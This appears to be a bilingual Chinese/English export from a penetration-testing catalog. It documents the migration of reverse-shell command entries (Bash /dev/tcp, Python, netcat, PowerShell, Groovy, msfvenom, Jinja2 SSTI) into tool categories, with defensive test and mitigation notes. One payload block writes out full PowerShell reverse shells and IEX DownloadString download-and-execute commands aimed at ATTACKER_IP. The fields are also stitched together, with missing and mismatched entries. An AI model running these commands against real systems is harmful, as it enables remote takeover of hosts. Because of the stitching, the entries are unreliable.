analysis.zh: 本条阳性是命令/字典被准确迁移，原字节、来源和隔离测试主机记录到单次授权连接，命令版本与 Bash 环境匹配且没有把连接本身当成初始漏洞保留；它不确认目标漏洞。命令可运行、已有 Shell 回连、字典命中或签名相似均不能证明“不同 Bash 文件描述符布局和 /dev/tcp 写法的运行前提、重复关系与 Shell 兼容性”对应的初始漏洞。
analysis.en: A positive means accurate migration with original bytes, provenance, and an isolated test host records one authorized connection, the command matches the Bash environment, and the connection is not treated as the initial vulnerability; it does not confirm a target vulnerability. Runnable commands, callbacks from an existing shell, wordlist hits, or signature similarity do not prove an initial vulnerability related to runtime prerequisites, duplication, and shell compatibility across Bash file-descriptor layouts and dev-tcp forms.

opsecTips.zh: Bash /dev/tcp 反连命令停止条件：默认离线解析；执行时只用一次性自有地址和固定标记。指向公共地址、生成真实载荷、打开交互 Shell 或触碰非测试文件时立即停止。 本条重点观察“不同 Bash 文件描述符布局和 /dev/tcp 写法的运行前提、重复关系与 Shell 兼容性”。
opsecTips.en: Bash Dev-TCP Reverse Connection Commands stop condition: Prefer offline parsing; use disposable owned destinations and fixed markers if execution is needed. Stop on public destinations, real payload generation, interactive shells, or non-test files. The entry-specific focus is runtime prerequisites, duplication, and shell compatibility across Bash file-descriptor layouts and dev-tcp forms.

opsecTips.zh: Bash /dev/tcp 反连命令清理条件：迁移后关闭监听器，删除 FIFO、生成文件、下载脚本和测试字典副本，销毁环境并核对目标 Tool 无重复或未标记失效行。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Bash Dev-TCP Reverse Connection Commands cleanup condition: Close listeners, remove FIFOs, generated files, downloads, and wordlist copies, destroy the environment, and verify destination tools have no duplicates or untagged invalid lines. Recheck that no triggerable state remains for this technique.

name.zh: Bash /dev/udp 反连命令

description.zh: 使用 Bash /dev/udp 和交互式 sh/bash 的 UDP 反连变体，属于命令工具参考，并不表示 UDP 会提供可靠会话。
description.en: UDP reverse-connection variants using Bash dev-udp and interactive sh or bash; they are command references and do not imply a reliable UDP session.

overview.zh: Bash /dev/udp 反连命令是工具命令或参考字典，不是独立 Payload。维护目标为sh 与 Bash 路径、/dev/udp 支持和无连接 UDP 对交互输入输出可靠性的影响。其适用前提为：目标实际由 Bash 解释重定向、允许出站 UDP，且测试者已经在授权范围内取得命令执行。迁移质量以受控监听器看到唯一数据报并与目标进程日志对应，同时明确记录丢包、无状态和 Shell 不兼容结果为准，不能把工具命令可运行或字典命中自动报告为目标漏洞。
overview.en: Bash Dev-UDP Reverse Connection Commands is tool command or reference data rather than an independent payload. It maintains the effect of sh versus Bash paths, dev-udp support, and connectionless UDP on interactive input and output reliability. Its prerequisites are Bash actually interprets the redirection, outbound UDP is allowed, and command execution has already been obtained within scope. Migration quality requires a controlled listener receives a unique datagram correlated with target process logs while loss, statelessness, and shell incompatibility are recorded; a runnable tool command or wordlist hit is not automatically a target finding.

vulnerability.zh: 该条目本身不建立漏洞。真实风险取决于目标实际由 Bash 解释重定向、允许出站 UDP，且测试者已经在授权范围内取得命令执行，随后才可能用这些命令或特征审查“sh 与 Bash 路径、/dev/udp 支持和无连接 UDP 对交互输入输出可靠性的影响”。必须把前置执行入口、目标环境和工具结果分开记录，避免把后渗透能力倒置成初始攻击链。
vulnerability.en: The entry does not establish a vulnerability. Risk depends on Bash actually interprets the redirection, outbound UDP is allowed, and command execution has already been obtained within scope, after which the commands or signatures may examine the effect of sh versus Bash paths, dev-udp support, and connectionless UDP on interactive input and output reliability. Keep the prerequisite execution entry, target environment, and tool result separate so post-exploitation capability is not inverted into an initial chain.

exploitation.zh: 在隔离容器中分别由 dash、sh 与 Bash 调用四个变体，记录解析错误、首个数据报和交互稳定性，不把超时自动判断为安全。迁移时逐行保留字节、来源、平台或版本标签与副作用说明，执行验证仅限一次性环境和固定无害标记；不支持、失效或仅用于识别的行必须显式标注。
exploitation.en: invoke the four variants under dash, sh, and Bash in isolation, recording parse errors, first datagrams, and interaction stability without treating timeout as proof of safety. Preserve bytes, provenance, platform or version tags, and side effects line by line; execute only in disposable environments with fixed harmless markers, and explicitly label unsupported, invalid, or signature-only lines.

mitigation.zh: 合并到 bash-reverse 并注明 UDP 的限制与 Bash 专属语法，主机策略应限制不必要的出站 UDP 并监控交互 Shell 子进程。工具卡回归需要确认目标入口可达、原命令可复制、精确重复被合并、失效项仍可追溯，并且 Payload 导航不再重复展示纯命令或字典。
mitigation.en: merge into bash-reverse with UDP limitations and Bash-specific syntax documented, while restricting unnecessary UDP egress and monitoring interactive shell child processes. Tool-card regression must prove the destination is reachable, original commands remain copyable, exact duplicates are merged, invalid items remain traceable, and payload navigation no longer duplicates commands or dictionaries.

name.zh: Python IPv4 Socket 反连命令
name.en: Python IPv4 Socket Reverse Connection Commands

description.zh: 组合 socket、dup2、subprocess 与 pty 的 Python 2/3 IPv4 反连命令，属于 Python 工具命令并包含大量 Shell 路径重复变体。
description.en: Python 2 and 3 IPv4 reverse-connection commands combining socket, dup2, subprocess, and pty, with many duplicate shell-path variants that belong in tooling.

overview.zh: Python IPv4 Socket 反连命令是工具命令或参考字典，不是独立 Payload。维护目标为Python 版本、socket 连接、文件描述符复制与 pty 启动方式之间的兼容性和重复关系。其适用前提为：目标存在可执行的 Python 解释器，允许到测试地址的出站 TCP，并已具备授权命令执行入口。迁移质量以隔离监听器的唯一连接与 Python PID、版本和标准流重定向日志相对应为准，不能把工具命令可运行或字典命中自动报告为目标漏洞。
overview.en: Python IPv4 Socket Reverse Connection Commands is tool command or reference data rather than an independent payload. It maintains compatibility and duplication across Python versions, socket connections, file-descriptor duplication, and pty startup forms. Its prerequisites are the target has an executable Python interpreter, permits outbound TCP to the test address, and already exposes an authorized command-execution entry. Migration quality requires a unique isolated-listener connection correlates with the Python PID, version, and standard-stream redirection logs; a runnable tool command or wordlist hit is not automatically a target finding.

vulnerability.zh: 该条目本身不建立漏洞。真实风险取决于目标存在可执行的 Python 解释器，允许到测试地址的出站 TCP，并已具备授权命令执行入口，随后才可能用这些命令或特征审查“Python 版本、socket 连接、文件描述符复制与 pty 启动方式之间的兼容性和重复关系”。必须把前置执行入口、目标环境和工具结果分开记录，避免把后渗透能力倒置成初始攻击链。
vulnerability.en: The entry does not establish a vulnerability. Risk depends on the target has an executable Python interpreter, permits outbound TCP to the test address, and already exposes an authorized command-execution entry, after which the commands or signatures may examine compatibility and duplication across Python versions, socket connections, file-descriptor duplication, and pty startup forms. Keep the prerequisite execution entry, target environment, and tool result separate so post-exploitation capability is not inverted into an initial chain.

exploitation.zh: 在 Python 2 与 3 一次性环境中逐行运行，比较 subprocess.call 与 pty.spawn 的会话行为，并按解释器与 Shell 路径合并等价项。迁移时逐行保留字节、来源、平台或版本标签与副作用说明，执行验证仅限一次性环境和固定无害标记；不支持、失效或仅用于识别的行必须显式标注。
exploitation.en: run each line in disposable Python 2 and 3 environments, compare subprocess.call with pty.spawn behavior, and merge equivalents by interpreter and shell path. Preserve bytes, provenance, platform or version tags, and side effects line by line; execute only in disposable environments with fixed harmless markers, and explicitly label unsupported, invalid, or signature-only lines.

mitigation.zh: 迁入 python-reverse 并保留 Python 版本与 pty 标签；运行环境应移除不必要解释器、限制出口并审计 socket 与交互 Shell 行为。工具卡回归需要确认目标入口可达、原命令可复制、精确重复被合并、失效项仍可追溯，并且 Payload 导航不再重复展示纯命令或字典。
mitigation.en: move to python-reverse with Python-version and pty tags, and remove unnecessary interpreters, restrict egress, and audit socket plus interactive-shell behavior. Tool-card regression must prove the destination is reachable, original commands remain copyable, exact duplicates are merged, invalid items remain traceable, and payload navigation no longer duplicates commands or dictionaries.

exploitation.zh: 先查询 busybox nc --help，再分别在 Shell 与模拟表单解码入口测试原始、加号和 IFS 版本，记录哪些变体只是编码素材。迁移时逐行保留字节、来源、平台或版本标签与副作用说明，执行验证仅限一次性环境和固定无害标记；不支持、失效或仅用于识别的行必须显式标注。
exploitation.en: inspect busybox nc help, then test raw, plus, and IFS forms separately in shell and simulated form-decoding inputs, recording which variants are only encoding material. Preserve bytes, provenance, platform or version tags, and side effects line by line; execute only in disposable environments with fixed harmless markers, and explicitly label unsupported, invalid, or signature-only lines.

mitigation.zh: 迁入 nc-reverse 并标记 BusyBox 与输入层前提；固件最小化 applet、限制出站网络并避免将请求参数交给 Shell。工具卡回归需要确认目标入口可达、原命令可复制、精确重复被合并、失效项仍可追溯，并且 Payload 导航不再重复展示纯命令或字典。
mitigation.en: move to nc-reverse with BusyBox and input-layer prerequisites, minimize firmware applets, restrict egress, and avoid passing request parameters to a shell. Tool-card regression must prove the destination is reachable, original commands remain copyable, exact duplicates are merged, invalid items remain traceable, and payload navigation no longer duplicates commands or dictionaries.

description.en: Mixes TCPClient loops, DownloadString, and Powercat download-execution forms; these are PowerShell reverse-connection tool references involving plaintext HTTP and high-risk IEX behavior.

overview.zh: PowerShell TCP 与下载执行命令是工具命令或参考字典，不是独立 Payload。维护目标为原生 TCPClient 会话与 IEX/DownloadString 下载执行的网络、进程和脚本日志差异。其适用前提为：PowerShell 可执行、脚本语言模式和 AMSI 策略允许相关调用，并且出站 TCP/HTTP 已获授权。迁移质量以PowerShell 事件日志、脚本块或命令行、目标连接和测试脚本哈希能够关联为准，不能把工具命令可运行或字典命中自动报告为目标漏洞。

description.zh: 测试步骤为：在一次性 Windows 虚拟机中先解析命令并替换为本地固定脚本，分别测试 TCPClient、DownloadString 与 Powercat 路径，禁止访问公共地址。完整保留原命令并只在一次性环境用固定标记验证。
description.en: use a disposable Windows VM, replace downloads with a fixed local script, and test TCPClient, DownloadString, and Powercat paths separately without public destinations. Preserve the original command in full and validate only with fixed markers in a disposable environment.

attackChain.payload:
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
powershell IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:PORT/reverse.ps1')
C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1');powercat -c ATTACKER_IP -p PORT -e cmd"

title.zh: 建立目标 Tool 回归

description.zh: 实施“迁入 powershell-reverse 并按原生连接和下载执行分组；生产启用脚本块日志、AMSI、受限语言模式和出口允许列表”，确认工具入口、复制、去重、版本标签与导航均正确，且 Payload 树不再重复。
description.en: Apply move to powershell-reverse grouped by native connection versus download execution, and enable script-block logging, AMSI, constrained language, and egress allowlists in production and verify tool access, copying, deduplication, version tags, and navigation without payload-tree duplication.

review.rationale: PowerShell TCP 与下载执行命令是纯工具命令或参考字典，应迁入 powershell-reverse，保留原始字节、来源和适用前提。

prerequisites.zh: 已确认“PowerShell TCP 与下载执行命令”是纯命令/字典，目标 Tool powershell-reverse 均存在，并记录来源、版本及前提：PowerShell 可执行、脚本语言模式和 AMSI 策略允许相关调用，并且出站 TCP/HTTP 已获授权。
prerequisites.en: The PowerShell TCP and Download-Execution Commands record is command or dictionary data, destination tools powershell-reverse exist, and provenance, version, and prerequisites are recorded: PowerShell is executable, language mode and AMSI policy permit the calls, and outbound TCP or HTTP is authorized.

prerequisites.zh: 可在一次性主机或离线解析器逐行验证，并用PowerShell 事件日志、脚本块或命令行、目标连接和测试脚本哈希能够关联检查迁移完整性。
prerequisites.en: Every line can be checked in a disposable host or offline parser, using PowerShell event logs, script block or command line, destination connection, and test-script hash correlate for migration completeness.

analysis.zh: 本条阳性是命令/字典被准确迁移，原字节、来源和PowerShell 事件日志、脚本块或命令行、目标连接和测试脚本哈希能够关联保留；它不确认目标漏洞。命令可运行、已有 Shell 回连、字典命中或签名相似均不能证明“原生 TCPClient 会话与 IEX/DownloadString 下载执行的网络、进程和脚本日志差异”对应的初始漏洞。
analysis.en: A positive means accurate migration with original bytes, provenance, and PowerShell event logs, script block or command line, destination connection, and test-script hash correlate; it does not confirm a target vulnerability. Runnable commands, callbacks from an existing shell, wordlist hits, or signature similarity do not prove an initial vulnerability related to network, process, and script-logging differences between native TCPClient sessions and IEX or DownloadString execution.

opsecTips.zh: PowerShell TCP 与下载执行命令停止条件：默认离线解析；执行时只用一次性自有地址和固定标记。指向公共地址、生成真实载荷、打开交互 Shell 或触碰非测试文件时立即停止。 本条重点观察“原生 TCPClient 会话与 IEX/DownloadString 下载执行的网络、进程和脚本日志差异”。
opsecTips.en: PowerShell TCP and Download-Execution Commands stop condition: Prefer offline parsing; use disposable owned destinations and fixed markers if execution is needed. Stop on public destinations, real payload generation, interactive shells, or non-test files. The entry-specific focus is network, process, and script-logging differences between native TCPClient sessions and IEX or DownloadString execution.

opsecTips.zh: PowerShell TCP 与下载执行命令清理条件：迁移后关闭监听器，删除 FIFO、生成文件、下载脚本和测试字典副本，销毁环境并核对目标 Tool 无重复或未标记失效行。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: PowerShell TCP and Download-Execution Commands cleanup condition: Close listeners, remove FIFOs, generated files, downloads, and wordlist copies, destroy the environment, and verify destination tools have no duplicates or untagged invalid lines. Recheck that no triggerable state remains for this technique.

name.zh: Telnet FIFO Shell 管道命令

description.zh: 通过 telnet、命名管道和本地 Shell 组合输入输出的反连流程，属于 Linux 命令工具参考，且部分行存在重定向可移植性问题。
description.en: Reverse pipelines combining telnet, named pipes, and local shells; these are Linux command references with portability issues in some redirections.

overview.zh: Telnet FIFO Shell 管道命令是工具命令或参考字典，不是独立 Payload。维护目标为不同 telnet 客户端、mknod/mkfifo 和 Shell 重定向语法能否形成稳定双向管道。其适用前提为：目标安装 telnet 和管道工具、临时目录可写、出站连接已获授权且执行 Shell 明确在测试范围。迁移质量以随机管道路径、telnet 连接、Shell 子进程与清理记录形成一条完整实验记录为准，不能把工具命令可运行或字典命中自动报告为目标漏洞。
overview.en: Telnet FIFO Shell Pipeline Commands is tool command or reference data rather than an independent payload. It maintains whether different telnet clients, mknod or mkfifo, and shell redirection syntax form a stable bidirectional pipeline. Its prerequisites are the target has telnet and pipe tools, writable temporary storage, authorized egress, and explicit scope for shell execution. Migration quality requires the randomized pipe path, telnet connection, shell child process, and cleanup record form one complete experiment; a runnable tool command or wordlist hit is not automatically a target finding.

vulnerability.zh: 该条目本身不建立漏洞。真实风险取决于目标安装 telnet 和管道工具、临时目录可写、出站连接已获授权且执行 Shell 明确在测试范围，随后才可能用这些命令或特征审查“不同 telnet 客户端、mknod/mkfifo 和 Shell 重定向语法能否形成稳定双向管道”。必须把前置执行入口、目标环境和工具结果分开记录，避免把后渗透能力倒置成初始攻击链。
vulnerability.en: The entry does not establish a vulnerability. Risk depends on the target has telnet and pipe tools, writable temporary storage, authorized egress, and explicit scope for shell execution, after which the commands or signatures may examine whether different telnet clients, mknod or mkfifo, and shell redirection syntax form a stable bidirectional pipeline. Keep the prerequisite execution entry, target environment, and tool result separate so post-exploitation capability is not inverted into an initial chain.

exploitation.zh: 逐行在隔离容器验证解析，使用随机 FIFO 与固定 echo，记录第一个疑似缺少重定向符的变体是否实际可用，并完成清理。迁移时逐行保留字节、来源、平台或版本标签与副作用说明，执行验证仅限一次性环境和固定无害标记；不支持、失效或仅用于识别的行必须显式标注。
exploitation.en: parse and test each line in isolation with a random FIFO and fixed echo marker, record whether the first apparently malformed redirection works, and complete cleanup. Preserve bytes, provenance, platform or version tags, and side effects line by line; execute only in disposable environments with fixed harmless markers, and explicitly label unsupported, invalid, or signature-only lines.

mitigation.zh: 迁入 linux-command-tricks 并标记不可移植或失效语法；生产移除 telnet 客户端、限制临时目录与非业务出口并监控管道到 Shell 的进程链。工具卡回归需要确认目标入口可达、原命令可复制、精确重复被合并、失效项仍可追溯，并且 Payload 导航不再重复展示纯命令或字典。
mitigation.en: move to linux-command-tricks with nonportable or invalid forms tagged, and remove telnet clients, restrict temporary storage and non-business egress, and monitor pipe-to-shell process chains. Tool-card regression must prove the destination is reachable, original commands remain copyable, exact duplicates are merged, invalid items remain traceable, and payload navigation no longer duplicates commands or dictionaries.

name.zh: Groovy 进程执行与反连命令
name.en: Groovy Process Execution and Reverse Commands

description.zh: 覆盖 Runtime.exec、String.execute、Netcat 与 PowerShell 的 Groovy 进程调用片段，属于 Groovy 反连工具命令并混有 Windows 路径转义疑点。
description.en: Covers Groovy Runtime.exec and String.execute snippets invoking Netcat or PowerShell; these are Groovy reverse-command references with questionable Windows path escaping.

overview.zh: Groovy 进程执行与反连命令是工具命令或参考字典，不是独立 Payload。维护目标为Groovy Runtime.exec、String.execute 和跨平台命令字符串的参数拆分、转义及进程等待行为。其适用前提为：目标允许执行 Groovy 脚本、存在对应 Shell 或外部工具，并已批准出站连接与子进程测试。迁移质量以Groovy 版本、最终参数数组、子进程退出状态和受控连接能够对应，错误转义行被明确标记为准，不能把工具命令可运行或字典命中自动报告为目标漏洞。
overview.en: Groovy Process Execution and Reverse Commands is tool command or reference data rather than an independent payload. It maintains argument splitting, escaping, and process-wait behavior across Groovy Runtime.exec, String.execute, and cross-platform command strings. Its prerequisites are the target executes Groovy scripts, provides the referenced shell or external tool, and authorizes outbound connection and child-process testing. Migration quality requires Groovy version, final argument vector, child exit status, and controlled connection correlate, with malformed escaping explicitly tagged; a runnable tool command or wordlist hit is not automatically a target finding.

vulnerability.zh: 该条目本身不建立漏洞。真实风险取决于目标允许执行 Groovy 脚本、存在对应 Shell 或外部工具，并已批准出站连接与子进程测试，随后才可能用这些命令或特征审查“Groovy Runtime.exec、String.execute 和跨平台命令字符串的参数拆分、转义及进程等待行为”。必须把前置执行入口、目标环境和工具结果分开记录，避免把后渗透能力倒置成初始攻击链。
vulnerability.en: The entry does not establish a vulnerability. Risk depends on the target executes Groovy scripts, provides the referenced shell or external tool, and authorizes outbound connection and child-process testing, after which the commands or signatures may examine argument splitting, escaping, and process-wait behavior across Groovy Runtime.exec, String.execute, and cross-platform command strings. Keep the prerequisite execution entry, target environment, and tool result separate so post-exploitation capability is not inverted into an initial chain.

exploitation.zh: 在 Linux 与 Windows 一次性 Groovy 环境逐块执行，不把多行脚本误作独立命令，并使用固定 echo 与本地测试脚本替代外部下载。迁移时逐行保留字节、来源、平台或版本标签与副作用说明，执行验证仅限一次性环境和固定无害标记；不支持、失效或仅用于识别的行必须显式标注。
exploitation.en: execute blocks in disposable Linux and Windows Groovy environments, do not treat multi-line scripts as separate commands, and replace external downloads with fixed local scripts and echo markers. Preserve bytes, provenance, platform or version tags, and side effects line by line; execute only in disposable environments with fixed harmless markers, and explicitly label unsupported, invalid, or signature-only lines.

mitigation.zh: 迁入 groovy-reverse 并按操作系统和脚本块分组；生产禁用不可信 Groovy 求值、限制子进程与出口并保留进程审计。工具卡回归需要确认目标入口可达、原命令可复制、精确重复被合并、失效项仍可追溯，并且 Payload 导航不再重复展示纯命令或字典。
mitigation.en: move to groovy-reverse grouped by operating system and script block, and disable untrusted Groovy evaluation, restrict child processes and egress, and retain process auditing. Tool-card regression must prove the destination is reachable, original commands remain copyable, exact duplicates are merged, invalid items remain traceable, and payload navigation no longer duplicates commands or dictionaries.

prerequisites.en: Every line can be checked in a disposable host or offline parser, using Groovy version, final argument vector, child exit status, and controlled connection correlate, with malformed escaping explicitly tagged for migration completeness.

analysis.zh: 本条阳性是命令/字典被准确迁移，原字节、来源和Groovy 版本、最终参数数组、子进程退出状态和受控连接能够对应，错误转义行被明确标记保留；它不确认目标漏洞。命令可运行、已有 Shell 回连、字典命中或签名相似均不能证明“Groovy Runtime.exec、String.execute 和跨平台命令字符串的参数拆分、转义及进程等待行为”对应的初始漏洞。

description.zh: 使用 msfvenom 生成 WAR、JAR、JSP、PHP、ASPX、EXE 与 ELF 输出，完全属于 Metasploit 工具命令，不应作为单一 WebShell Payload。
description.en: Uses msfvenom to generate WAR, JAR, JSP, PHP, ASPX, EXE, and ELF outputs; these are Metasploit tool commands rather than one webshell payload.

overview.zh: Msfvenom Web 与可执行文件生成命令是工具命令或参考字典，不是独立 Payload。维护目标为不同 Metasploit payload 模块、架构与输出格式如何映射到部署容器和目标操作系统。其适用前提为：测试者在隔离环境运行与数据库版本匹配的 msfvenom，LHOST/LPORT 属于自有测试地址，且生成文件不会进入真实业务系统。迁移质量以msfvenom 版本、模块信息、生成命令、文件格式与哈希全部保存，并明确其只是工具产物而非漏洞证据为准，不能把工具命令可运行或字典命中自动报告为目标漏洞。
overview.en: Msfvenom Web and Executable Payload Generation Commands is tool command or reference data rather than an independent payload. Its prerequisites are the tester runs a database-compatible msfvenom in isolation, LHOST and LPORT are controlled test values, and generated files never reach a live business system. Migration quality requires msfvenom version, module information, generation command, file format, and hash are preserved while clearly separated from vulnerability evidence; a runnable tool command or wordlist hit is not automatically a target finding.

name.zh: TTY 升级与本地 Shell 启动命令

description.zh: 混合 Python pty、解释器、编辑器、分页器、归档器与环境命令的本地 Shell 启动技巧，属于后渗透命令手册而非 WebShell Payload。

subCategory.zh: TTY 与本地 Shell 升级

overview.zh: TTY 升级与本地 Shell 启动命令是工具命令或参考字典，不是独立 Payload。维护目标为哪些行用于生成 PTY、哪些依赖交互程序转义或 GTFOBins 行为，以及各自的前置二进制与权限。其适用前提为：已经存在授权的低交互 Shell，目标具备对应二进制，且本地提权或交互转义测试得到单独批准。迁移质量以每行命令对应的二进制版本、TTY 状态、有效 UID、子进程树和退出清理均被记录为准，不能把工具命令可运行或字典命中自动报告为目标漏洞。

Its prerequisites are an authorized low-interaction shell already exists, the target provides the relevant binary, and local privilege or interactive escape testing has separate approval. Stop on public destinations, real payload generation, interactive shells, or non-test files. The entry-specific focus is the distinction between ExifTool metadata writing, double-extension renaming, and web-server content-type or handler mapping.

opsecTips.zh: ExifTool 图片元数据写入命令清理条件：迁移后关闭监听器，删除 FIFO、生成文件、下载脚本和测试字典副本，销毁环境并核对目标 Tool 无重复或未标记失效行。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: ExifTool Image Metadata Injection Commands cleanup condition: Close listeners, remove FIFOs, generated files, downloads, and wordlist copies, destroy the environment, and verify destination tools have no duplicates or untagged invalid lines. Recheck that no triggerable state remains for this technique.

name.zh: Jinja2 SSTI 进程执行链

description.zh: 覆盖 Flask globals、Python 子类枚举和 builtins 导入的 Jinja2 表达式，用于确认模板注入是否跨越沙箱并到达进程执行。
description.en: Covers Flask globals, Python subclass enumeration, and builtins imports in Jinja2 expressions to test whether template injection escapes sandboxing and reaches process execution.

overview.zh: 覆盖 Jinja2 SSTI 到进程执行的升级链验证：以 Flask globals、Python 子类枚举与 builtins 导入三类对象图链触发反向 shell，确认模板注入跨越沙箱到达进程执行。
overview.en: Covers escalation-chain verification from Jinja2 SSTI to process execution: triggering reverse shells via three object-graph chains — Flask globals, Python subclass enumeration, and builtins imports — confirming template injection crosses the sandbox into process execution.

vulnerability.zh: 根因是不可信字符串由 Jinja2 当作模板源码编译，沙箱未启用或对象属性策略可绕过，进程账户允许创建子进程；对象解析链是否可达 os/subprocess 取决于模板上下文暴露面。
vulnerability.en: The root cause is untrusted strings compiled by Jinja2 as template source with sandboxing off or attribute policies bypassable, while the process account allows spawning children; whether object-resolution chains reach os/subprocess depends on template-context exposure.

exploitation.zh: 使用第 1 步命令以三种 Jinja2 对象图链触发反向 shell，{ATTACKER_IP}:{LPORT} 渲染为授权监听地址；监听端收到回连会话即确认 SSTI 到进程执行链成立。仅在授权实验环境执行；先用算术与安全属性访问建立 SSTI 基线，再把反连命令替换为固定 stdout 标记逐条确认三类对象链，取得最小证据后停止。
exploitation.en: Use the step 1 command to trigger reverse shells via the three Jinja2 object-graph chains, with {ATTACKER_IP}:{LPORT} rendered as the authorized listener; the listener receiving a callback session confirms the SSTI-to-process-execution chain. Execute only in authorized labs; baseline SSTI with arithmetic and safe property access first, then swap callback commands for fixed stdout markers verifying each object chain, stopping at minimal evidence.

mitigation.zh: 禁止将用户内容作为模板源码，使用固定模板与数据参数；启用并收紧沙箱属性策略，以低权限运行并阻止模板进程创建子进程；回归确认不可信内容始终作为数据处理且无法访问 globals、类型对象或进程 API。
mitigation.en: Never use user content as template source — fixed templates with data parameters instead; enable and tighten sandbox attribute policies, run low-privileged, and block template processes from spawning children; regress to confirm untrusted content stays data and cannot reach globals, type objects, or process APIs.

title.zh: 确认 Jinja2 模板源码可控

description.zh: 使用算术和固定字符串区分模板源码注入与普通变量渲染，并核对“不可信字符串由 Jinja2 当作模板源码编译，沙箱未启用或对象属性策略可绕过，进程账户允许创建子进程”。
description.en: Use arithmetic and fixed strings to distinguish template-source injection from ordinary variable rendering and confirm that an untrusted string is compiled as Jinja2 template source, sandboxing is absent or attribute policy is bypassable, and the process identity can create child processes.

title.zh: 枚举允许的对象边界

description.zh: 逐步检查 request、globals、类型属性与沙箱拒绝记录，采用“模板表达式解析路径、渲染日志、子进程固定标记与同一请求 ID 完整关联”作为跨入进程边界的证据。
description.en: Inspect request, globals, type attributes, and sandbox denials incrementally, using the template resolution path, render log, fixed child-process marker, and request identifier fully correlate as evidence of process-boundary crossing.

title.zh: 无害重放“Jinja2 SSTI 进程执行链”对象链
title.en: Replay the Jinja2 SSTI Process Execution Chains chain harmlessly

description.zh: 测试步骤为：先用算术与安全属性访问建立 SSTI 基线，再将反连命令替换为固定 stdout 标记，逐条确认 globals、subclasses 和 builtins 三类对象链。每条反连命令在运行前替换为固定 stdout 标记。
description.en: establish SSTI with arithmetic and safe attribute access, replace reverse commands with a fixed stdout marker, and test globals, subclasses, and builtins object chains separately. Replace every reverse command with a fixed stdout marker before runtime.

title.zh: 固定模板并隔离 worker

description.zh: 实施“禁止将用户内容作为模板源码，使用固定模板和数据参数；启用并收紧沙箱属性策略，以低权限运行并阻止模板进程创建子进程”后重放算术、合法变量和原对象链，确认渲染保留且对象遍历被拒绝。
description.en: Apply never compile user content as template source, use fixed templates with data parameters, enforce strict sandbox attribute policy, run with least privilege, and prevent template workers from spawning processes, then replay arithmetic, valid variables, and original chains to preserve rendering while denying object traversal.

review.rationale: Jinja2 SSTI 进程执行链保留为 Payload，因为它描述具体输入到解析器、运行时或文件/进程能力的数据流，并有明确证据标准。

prerequisites.zh: 已用无害算术确认“Jinja2 SSTI 进程执行链”存在模板源码求值，并记录 Jinja2/Flask 版本、沙箱和可见对象，满足：不可信字符串由 Jinja2 当作模板源码编译，沙箱未启用或对象属性策略可绕过，进程账户允许创建子进程。
prerequisites.en: Harmless arithmetic confirms template-source evaluation for Jinja2 SSTI Process Execution Chains; Jinja2 or Flask versions, sandboxing, and exposed objects are recorded, and an untrusted string is compiled as Jinja2 template source, sandboxing is absent or attribute policy is bypassable, and the process identity can create child processes.

prerequisites.zh: 一次性模板 worker 可记录属性拒绝、渲染、子进程审计和模板表达式解析路径、渲染日志、子进程固定标记与同一请求 ID 完整关联。
prerequisites.en: A disposable template worker can record denied attributes, rendering, child-process auditing, and the template resolution path, render log, fixed child-process marker, and request identifier fully correlate.

analysis.zh: 阳性要求模板源码逐步到达 globals/类型对象，再到进程 API，并取得模板表达式解析路径、渲染日志、子进程固定标记与同一请求 ID 完整关联。算术成立、对象名回显、subclasses 索引报错或反连字符串被渲染均是假阳性，不能证明“模板上下文是否暴露 request、应用 globals、Python 类型对象或 builtins，并允许解析链调用 os 或 subprocess”。
analysis.en: A positive traces template source through globals or type objects to a process API and obtains the template resolution path, render log, fixed child-process marker, and request identifier fully correlate. Arithmetic, reflected object names, subclass-index errors, or rendered reverse-command strings are false positives and do not prove whether template context exposes request, application globals, Python type objects, or builtins and permits a resolution chain to os or subprocess.

opsecTips.zh: Jinja2 SSTI 进程执行链停止条件：所有反连动作替换为固定 stdout 标记；worker 创建非预期进程、联网或访问真实文件时立即销毁并停止。 本条重点观察“模板上下文是否暴露 request、应用 globals、Python 类型对象或 builtins，并允许解析链调用 os 或 subprocess”。
opsecTips.en: Jinja2 SSTI Process Execution Chains stop condition: Replace reverse behavior with a fixed stdout marker; destroy the worker and stop on unexpected processes, network, or real-file access. The entry-specific focus is whether template context exposes request, application globals, Python type objects, or builtins and permits a resolution chain to os or subprocess.

opsecTips.zh: Jinja2 SSTI 进程执行链清理条件：结束后删除测试模板和缓存、轮换临时会话、重建 worker，并确认 globals、调试器和测试路由未残留。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Jinja2 SSTI Process Execution Chains cleanup condition: Delete test templates and caches, rotate temporary sessions, rebuild the worker, and verify globals, debuggers, and test routes are removed. Recheck that no triggerable state remains for this technique.

title.zh: lipsum 全局链

description.zh: 绕过 request.application 特征：改由 lipsum 全局取 os。判据：攻击机收到 shell。
description.en: Reaches os via lipsum globals instead of request. Success: shell received on the listener.

title.zh: cycler 全局链

description.zh: 纯 bash 反弹免 nc 依赖。判据：收到交互 shell。
